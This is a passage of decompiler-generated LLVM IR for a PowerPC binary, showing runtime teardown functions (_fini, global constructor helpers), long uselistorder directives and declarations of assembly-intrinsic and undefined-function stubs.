  store i32 %v1_10014640, i32* %r31.global-to-local, align 4
  %v3_10014644 = icmp eq i32 %v3_10014640, -1
  br i1 %v3_10014644, label %dec_label_pc_1001464c, label %dec_label_pc_10014638

dec_label_pc_1001464c:                            ; preds = %dec_label_pc_10014638, %entry
  %v0_1001465c = load i32, i32* @r3, align 4
  ret i32 %v0_1001465c

; uselistorder directives
  uselistorder i32 %v3_10014640, { 1, 0 }
  uselistorder i32 -4, { 23, 7, 8, 9, 16, 17, 18, 19, 20, 10, 11, 2, 3, 4, 5, 21, 22, 27, 28, 24, 25, 26, 12, 13, 14, 15, 0, 6, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, {}
  uselistorder i32 1, { 119, 202, 115, 197, 902, 327, 903, 904, 905, 906, 907, 908, 118, 116, 117, 909, 464, 910, 911, 84, 82, 81, 83, 912, 913, 465, 914, 915, 521, 85, 87, 86, 533, 113, 114, 916, 397, 917, 401, 918, 919, 920, 921, 922, 466, 923, 924, 925, 239, 238, 243, 242, 241, 240, 244, 237, 245, 926, 927, 928, 534, 230, 233, 231, 229, 232, 234, 929, 235, 236, 930, 246, 931, 66, 64, 63, 65, 387, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 536, 535, 129, 128, 127, 130, 131, 132, 723, 724, 725, 726, 537, 529, 163, 155, 165, 154, 160, 161, 162, 159, 157, 158, 156, 164, 166, 412, 932, 933, 390, 934, 935, 936, 937, 939, 940, 538, 14, 13, 16, 12, 15, 453, 944, 941, 942, 943, 539, 221, 219, 218, 215, 217, 220, 222, 214, 213, 216, 212, 211, 945, 751, 752, 753, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 9, 6, 7, 4, 11, 5, 8, 10, 402, 754, 284, 438, 962, 963, 964, 428, 403, 207, 206, 205, 965, 540, 204, 413, 966, 542, 541, 543, 287, 288, 286, 285, 203, 967, 968, 969, 970, 971, 972, 404, 545, 544, 199, 198, 200, 201, 405, 781, 18, 19, 17, 20, 782, 547, 546, 248, 247, 249, 973, 974, 549, 548, 105, 326, 328, 1018, 467, 468, 551, 550, 316, 312, 315, 314, 311, 313, 554, 553, 552, 106, 107, 555, 975, 388, 976, 979, 980, 981, 982, 983, 557, 556, 329, 330, 332, 331, 984, 985, 986, 384, 987, 988, 414, 989, 990, 434, 435, 469, 415, 429, 991, 471, 439, 992, 993, 472, 994, 995, 996, 470, 563, 562, 561, 560, 522, 559, 558, 192, 191, 188, 190, 193, 187, 194, 189, 195, 0, 1001, 1002, 1003, 1004, 416, 196, 755, 756, 259, 260, 757, 111, 110, 109, 108, 112, 783, 149, 151, 150, 152, 784, 785, 473, 786, 140, 141, 142, 138, 139, 134, 137, 136, 135, 564, 476, 787, 788, 789, 474, 790, 475, 791, 792, 793, 794, 795, 575, 574, 573, 572, 571, 570, 569, 568, 567, 566, 523, 565, 51, 44, 48, 49, 43, 50, 54, 52, 47, 53, 42, 46, 55, 45, 56, 57, 41, 40, 39, 887, 454, 61, 60, 58, 59, 62, 334, 333, 335, 1020, 1021, 382, 383, 381, 577, 576, 796, 797, 578, 340, 336, 337, 339, 338, 341, 417, 798, 581, 580, 579, 325, 153, 148, 262, 342, 289, 133, 477, 582, 21, 478, 441, 440, 760, 586, 585, 584, 583, 124, 123, 120, 121, 125, 122, 126, 1022, 589, 588, 587, 180, 179, 181, 178, 1023, 590, 743, 744, 745, 455, 746, 22, 23, 24, 479, 747, 418, 480, 481, 482, 483, 591, 727, 103, 99, 97, 101, 98, 102, 100, 104, 765, 419, 766, 592, 345, 344, 343, 346, 347, 348, 349, 175, 174, 176, 173, 321, 317, 320, 319, 322, 324, 318, 323, 593, 594, 595, 279, 597, 596, 171, 169, 170, 209, 210, 208, 398, 1000, 598, 225, 226, 1019, 350, 484, 485, 601, 600, 599, 268, 266, 267, 269, 265, 270, 255, 442, 602, 603, 604, 605, 606, 607, 608, 609, 456, 457, 1005, 420, 486, 1006, 1007, 443, 1017, 612, 611, 610, 292, 298, 296, 300, 293, 301, 297, 299, 294, 295, 302, 291, 613, 614, 615, 888, 889, 264, 263, 252, 251, 1024, 617, 616, 351, 619, 618, 89, 88, 90, 620, 893, 894, 895, 96, 95, 94, 91, 93, 92, 799, 800, 621, 352, 354, 353, 355, 847, 848, 849, 850, 851, 852, 853, 854, 855, 857, 856, 858, 859, 26, 25, 32, 30, 29, 31, 28, 27, 406, 801, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 303, 306, 304, 305, 307, 997, 998, 999, 860, 391, 35, 34, 33, 978, 977, 407, 938, 280, 761, 762, 763, 168, 1032, 1033, 146, 143, 147, 144, 145, 1028, 1029, 1030, 1031, 358, 357, 356, 71, 487, 802, 803, 489, 804, 805, 806, 807, 808, 809, 811, 812, 813, 490, 814, 815, 421, 816, 488, 817, 491, 818, 819, 820, 810, 625, 624, 623, 622, 79, 78, 74, 72, 73, 75, 76, 80, 77, 821, 822, 823, 824, 825, 361, 359, 360, 362, 363, 492, 227, 228, 826, 827, 69, 68, 70, 67, 829, 422, 830, 399, 423, 832, 833, 834, 835, 424, 837, 426, 836, 831, 524, 632, 631, 630, 629, 628, 627, 626, 367, 369, 364, 368, 366, 371, 365, 370, 372, 408, 409, 273, 274, 275, 828, 444, 525, 493, 276, 277, 278, 1026, 445, 1027, 634, 633, 374, 375, 373, 636, 635, 254, 281, 186, 380, 253, 182, 271, 224, 637, 256, 309, 308, 376, 377, 638, 378, 172, 257, 282, 223, 250, 639, 258, 640, 290, 1025, 641, 310, 728, 425, 430, 400, 729, 730, 731, 385, 496, 732, 733, 734, 427, 735, 736, 737, 738, 494, 495, 436, 497, 647, 646, 645, 644, 643, 642, 183, 184, 739, 740, 652, 651, 650, 526, 649, 648, 498, 741, 742, 653, 748, 749, 499, 654, 750, 656, 655, 758, 500, 661, 660, 659, 658, 657, 759, 663, 662, 764, 665, 664, 530, 767, 501, 768, 669, 668, 667, 666, 283, 458, 769, 671, 670, 38, 37, 36, 431, 389, 770, 432, 771, 672, 446, 772, 502, 503, 774, 392, 773, 504, 675, 674, 673, 386, 775, 776, 505, 506, 507, 890, 527, 777, 778, 447, 448, 508, 779, 509, 780, 393, 682, 681, 680, 679, 678, 677, 676, 449, 450, 683, 838, 839, 840, 510, 841, 842, 394, 843, 511, 844, 686, 685, 684, 528, 845, 261, 846, 687, 512, 861, 689, 688, 862, 167, 460, 863, 864, 459, 865, 866, 461, 462, 867, 868, 869, 1, 2, 871, 870, 513, 692, 691, 690, 514, 872, 873, 693, 695, 694, 697, 696, 515, 698, 874, 875, 451, 882, 883, 433, 884, 699, 437, 3, 701, 700, 411, 876, 877, 410, 880, 881, 516, 517, 878, 879, 702, 177, 885, 886, 272, 703, 891, 518, 892, 395, 706, 705, 704, 463, 396, 896, 897, 898, 899, 900, 379, 901, 452, 519, 520, 709, 708, 707, 711, 710, 185, 531, 532 }
  uselistorder label %dec_label_pc_10014638, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_10014678 = load i32, i32* @r3, align 4
  ret i32 %v0_10014678

; uselistorder directives
  uselistorder i32* @r3, { 19, 20, 21, 167, 168, 171, 169, 170, 0, 2, 172, 11, 173, 50, 51, 52, 174, 177, 178, 42, 22, 12, 73, 74, 13, 179, 180, 181, 182, 183, 184, 185, 23, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 109, 110, 111, 197, 198, 199, 200, 201, 202, 203, 229, 226, 227, 204, 205, 206, 207, 208, 209, 210, 211, 212, 14, 213, 214, 215, 216, 217, 218, 220, 75, 76, 15, 77, 78, 79, 24, 112, 113, 114, 115, 116, 16, 221, 40, 25, 117, 150, 152, 153, 154, 151, 118, 119, 120, 121, 122, 123, 3, 1, 124, 125, 126, 26, 230, 47, 242, 4, 27, 5, 39, 90, 91, 46, 236, 237, 238, 41, 93, 94, 95, 96, 97, 98, 99, 100, 53, 54, 55, 56, 57, 104, 105, 228, 92, 222, 223, 224, 155, 28, 29, 30, 31, 239, 240, 127, 128, 129, 130, 219, 175, 176, 17, 32, 241, 131, 33, 132, 34, 133, 134, 135, 6, 10, 7, 136, 8, 137, 9, 138, 139, 140, 141, 142, 143, 35, 144, 145, 146, 147, 148, 149, 49, 231, 232, 233, 234, 235, 84, 85, 86, 36, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 80, 81, 82, 83, 87, 88, 89, 48, 101, 102, 103, 106, 18, 107, 108, 156, 157, 158, 160, 159, 161, 162, 163, 43, 44, 164, 165, 166, 225, 37, 38, 45 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268519052, i32* @lr, align 4
  %v0_10014688 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_10014688

; uselistorder directives
  uselistorder i32 0, { 1499, 1500, 1501, 1502, 1503, 1504, 1505, 109, 1506, 1507, 1508, 1510, 1511, 1512, 35, 1515, 110, 1513, 1514, 56, 1516, 1517, 1518, 1521, 1519, 0, 1520, 1522, 111, 1523, 1524, 1525, 302, 1526, 1527, 1528, 24, 1251, 1252, 1544, 1531, 1534, 1535, 1536, 303, 1537, 1538, 1540, 1539, 1541, 1542, 1543, 1545, 1546, 1547, 1529, 1530, 1532, 1533, 112, 1548, 1550, 1551, 1549, 1552, 1553, 1554, 1555, 222, 1092, 1556, 223, 1093, 1094, 113, 114, 1103, 1104, 91, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 115, 174, 1113, 1112, 116, 1114, 1115, 118, 117, 1116, 304, 1117, 1118, 1119, 120, 119, 1120, 1121, 232, 305, 1122, 121, 1557, 1558, 1559, 1560, 1566, 1561, 60, 1567, 1568, 1562, 1563, 1564, 57, 58, 59, 1569, 306, 36, 37, 38, 217, 1571, 122, 1570, 307, 1572, 1573, 1574, 1575, 123, 1576, 92, 39, 1577, 175, 1578, 1579, 1580, 1189, 176, 124, 1581, 1582, 1583, 1584, 1585, 1586, 1591, 1587, 1588, 1589, 1590, 177, 1592, 1593, 1594, 1, 61, 1595, 1596, 1253, 1254, 1597, 1598, 1599, 125, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 308, 1609, 1610, 1611, 1612, 1613, 1614, 1255, 25, 1256, 127, 126, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 26, 309, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1717, 310, 1720, 64, 311, 233, 1721, 312, 1724, 1725, 62, 63, 1726, 1718, 1719, 313, 314, 1630, 1623, 315, 65, 1624, 1625, 1626, 40, 1628, 1629, 1631, 1632, 1633, 1634, 1635, 1636, 234, 220, 221, 317, 1637, 1638, 1639, 1641, 178, 1644, 318, 235, 1646, 1648, 1649, 1650, 316, 236, 1643, 1640, 1642, 1645, 1652, 224, 1655, 1656, 1657, 2, 1671, 1672, 1673, 129, 128, 1674, 3, 130, 237, 1190, 1191, 1192, 4, 1269, 1270, 180, 1272, 1271, 53, 5, 1273, 179, 6, 1274, 182, 1275, 54, 7, 1276, 181, 1675, 1676, 66, 1677, 1678, 1679, 1680, 1681, 1277, 1424, 1435, 1436, 1278, 1279, 1280, 1281, 1282, 319, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 131, 132, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 41, 1305, 320, 87, 1306, 1307, 1308, 1309, 1310, 133, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1482, 1483, 134, 1484, 1485, 1486, 290, 291, 1487, 1488, 1489, 27, 8, 1319, 1320, 1321, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1322, 1323, 1324, 1325, 1326, 93, 1727, 1728, 1729, 1732, 1730, 9, 183, 1329, 1328, 184, 1327, 94, 1330, 1331, 1332, 135, 1333, 1453, 1682, 1683, 238, 1684, 1209, 1733, 1734, 1735, 1736, 1685, 321, 322, 1752, 1753, 323, 1759, 1779, 185, 1780, 324, 1771, 10, 1737, 1738, 136, 1210, 1211, 325, 239, 326, 1212, 1213, 69, 70, 1214, 1215, 1216, 327, 1217, 1218, 1219, 67, 68, 1220, 1221, 1739, 1740, 1741, 1742, 1743, 1744, 137, 1751, 1149, 1150, 1151, 1152, 1153, 138, 1154, 1155, 1156, 292, 1157, 328, 1158, 240, 329, 330, 331, 1222, 332, 1227, 333, 1123, 1124, 1125, 139, 1126, 140, 1228, 1229, 186, 95, 108, 1230, 1231, 11, 1236, 1127, 1128, 141, 1129, 1130, 1131, 1688, 1690, 42, 1691, 71, 1692, 1689, 1686, 1687, 12, 1660, 1658, 1659, 187, 1661, 1662, 142, 1693, 1694, 334, 1695, 143, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 13, 14, 1095, 1223, 1224, 1225, 72, 73, 1226, 15, 335, 293, 294, 336, 1696, 1697, 188, 1698, 1699, 1700, 1701, 1707, 1708, 1709, 1710, 144, 1711, 1712, 1647, 1490, 241, 337, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 338, 1768, 16, 17, 1496, 145, 1334, 1335, 28, 29, 242, 30, 1336, 189, 18, 1443, 1444, 1445, 74, 1337, 1338, 190, 339, 1339, 1702, 1703, 1704, 1705, 1706, 1653, 1654, 191, 1627, 19, 86, 1565, 192, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1772, 1773, 1774, 75, 1775, 1776, 1777, 1778, 146, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 96, 1348, 1349, 1350, 1351, 1352, 225, 1353, 1354, 1355, 147, 1356, 1357, 1358, 1359, 1360, 148, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 149, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 43, 169, 170, 193, 1379, 1380, 150, 1381, 340, 1382, 1383, 341, 1386, 155, 151, 1384, 1385, 343, 1387, 1388, 1389, 1391, 156, 1392, 20, 21, 157, 158, 152, 153, 1393, 1394, 154, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 342, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1096, 1414, 1415, 31, 1417, 76, 97, 159, 344, 1420, 295, 1421, 1416, 1418, 1419, 1422, 1423, 160, 1099, 1100, 88, 55, 82, 1390, 194, 1746, 1748, 1747, 196, 161, 1750, 1749, 195, 243, 226, 1205, 1206, 1478, 1731, 345, 1232, 1722, 1723, 1132, 1492, 1509, 1133, 1457, 1754, 162, 1755, 1715, 1458, 1716, 1758, 1459, 1246, 1460, 1651, 1134, 1142, 1745, 1756, 1757, 1769, 1770, 229, 347, 348, 197, 1135, 351, 33, 34, 352, 1136, 1137, 358, 359, 428, 429, 32, 44, 227, 346, 1097, 349, 228, 350, 1138, 1139, 353, 1140, 354, 355, 246, 245, 244, 356, 1141, 357, 360, 247, 198, 1144, 361, 1143, 364, 365, 362, 363, 1145, 366, 1146, 367, 1147, 368, 1148, 369, 167, 165, 164, 163, 166, 1159, 230, 373, 248, 1160, 1161, 378, 1162, 1164, 372, 379, 1163, 201, 1165, 1166, 376, 1167, 1169, 371, 377, 1168, 200, 1170, 1171, 1172, 374, 1173, 1175, 370, 375, 1174, 199, 1176, 1177, 1178, 1179, 380, 1180, 1181, 381, 1182, 1183, 1184, 382, 1185, 1186, 1187, 1188, 249, 384, 385, 250, 383, 386, 387, 388, 389, 98, 99, 391, 253, 254, 251, 392, 1198, 390, 1193, 1194, 1195, 1196, 1197, 202, 1199, 1200, 393, 296, 1201, 252, 1202, 1203, 1204, 168, 394, 1207, 204, 1208, 203, 171, 395, 205, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 1233, 207, 396, 397, 398, 399, 400, 401, 402, 206, 414, 415, 416, 417, 297, 1234, 231, 1235, 77, 83, 84, 90, 89, 45, 46, 1237, 255, 256, 257, 258, 1245, 1239, 1241, 1242, 1243, 419, 1244, 420, 260, 259, 418, 78, 1238, 1240, 47, 100, 209, 208, 22, 23, 1098, 421, 1247, 261, 262, 263, 264, 1248, 1249, 265, 266, 422, 79, 1250, 267, 1437, 423, 424, 1438, 1439, 218, 427, 1440, 270, 426, 80, 1441, 269, 425, 210, 268, 48, 172, 1442, 271, 430, 431, 432, 1447, 433, 1446, 435, 436, 434, 1448, 1449, 298, 1450, 1451, 101, 49, 299, 1452, 211, 1454, 437, 438, 439, 272, 1455, 1456, 273, 440, 1461, 1462, 441, 1463, 1464, 1465, 442, 102, 276, 274, 275, 443, 444, 1477, 103, 50, 219, 212, 279, 280, 1466, 1467, 1468, 1469, 213, 277, 278, 281, 1470, 1471, 1472, 215, 51, 104, 105, 214, 1474, 1475, 1476, 300, 106, 52, 1473, 1479, 1480, 282, 445, 446, 447, 1481, 1491, 283, 301, 449, 1493, 285, 284, 448, 81, 450, 1494, 1495, 107, 85, 1497, 216, 173, 1498, 286, 287, 288, 289, 1713, 1789, 1790, 1791, 1714, 1101, 1102, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815 }
  uselistorder i32* @lr, { 9, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 222, 519, 520, 521, 387, 391, 388, 389, 390, 395, 396, 392, 393, 394, 397, 398, 399, 400, 401, 10, 11, 12, 15, 13, 14, 402, 406, 403, 1, 405, 0, 407, 410, 411, 408, 409, 412, 413, 414, 415, 416, 417, 418, 419, 133, 420, 421, 422, 423, 424, 425, 223, 224, 426, 427, 428, 429, 430, 431, 432, 433, 225, 226, 227, 228, 434, 435, 436, 437, 438, 526, 527, 528, 529, 522, 523, 524, 525, 439, 440, 444, 441, 442, 443, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 461, 462, 464, 465, 466, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 481, 482, 483, 134, 135, 136, 137, 229, 230, 231, 530, 232, 233, 281, 284, 234, 235, 282, 283, 236, 237, 238, 239, 240, 241, 242, 243, 531, 532, 285, 244, 245, 484, 485, 541, 542, 546, 547, 548, 549, 550, 563, 565, 567, 543, 545, 162, 163, 164, 165, 166, 167, 168, 533, 539, 540, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 185, 16, 17, 189, 19, 190, 18, 20, 486, 488, 487, 489, 490, 491, 478, 479, 480, 184, 323, 492, 493, 138, 463, 460, 214, 62, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 508, 509, 510, 511, 467, 359, 286, 287, 551, 552, 553, 554, 555, 558, 559, 560, 370, 246, 247, 248, 301, 302, 303, 304, 249, 506, 507, 404, 566, 564, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 7, 8, 267, 534, 535, 536, 537, 538, 561, 562, 148, 149, 150, 315, 332, 544, 333, 556, 557, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 139, 140, 141, 142, 143, 144, 145, 146, 147, 156, 151, 152, 153, 154, 155, 2, 157, 158, 159, 160, 161, 186, 187, 188, 3, 4, 5, 6, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 361, 362, 363, 211, 212, 213, 215, 216, 217, 218, 219, 220, 221, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 316, 317, 318, 319, 320, 321, 322, 324, 325, 326, 327, 328, 329, 330, 331, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 356, 355, 357, 358, 360, 364, 365, 366, 367, 368, 369, 371, 512, 513, 514, 515, 516, 517, 518 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %0 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
